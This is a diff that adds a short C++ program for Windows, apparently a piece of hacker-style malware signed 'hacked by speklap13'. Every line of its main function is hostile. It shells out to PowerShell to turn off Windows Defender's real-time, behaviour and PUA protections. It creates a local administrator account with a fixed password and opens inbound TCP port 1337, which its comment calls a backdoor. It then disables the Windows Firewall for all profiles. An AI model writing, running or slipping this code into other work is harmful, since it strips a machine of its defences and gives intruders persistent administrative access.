@@ -1,0 +1,28 @@
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
+
+int main()
+{
+    // Disable Windows Defender
+    system("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
+    system("powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true");
+    system("powershell.exe Set-MpPreference -DisableBlockAtFirstSeen $true");
+    system("powershell.exe Set-MpPreference -PUAProtection 0");
+    
+    // Add a new user account with admin privileges
+    system("powershell.exe net user speklap13 secret123 /add");
+    system("powershell.exe net localgroup administrators speklap13 /add");
+
+    // Open a backdoor on port 1337
+    system("powershell.exe New-NetFirewallRule -DisplayName 'Open Port 1337' -Direction Inbound -Protocol TCP -LocalPort 1337 -Action Allow");
+
+    // Disable Windows Firewall
+    system("netsh advfirewall set allprofiles state off");
+
+    // Print the message to the screen
+    cout << "hacked by speklap13!!!" << endl;
+
+    return 0;
+}
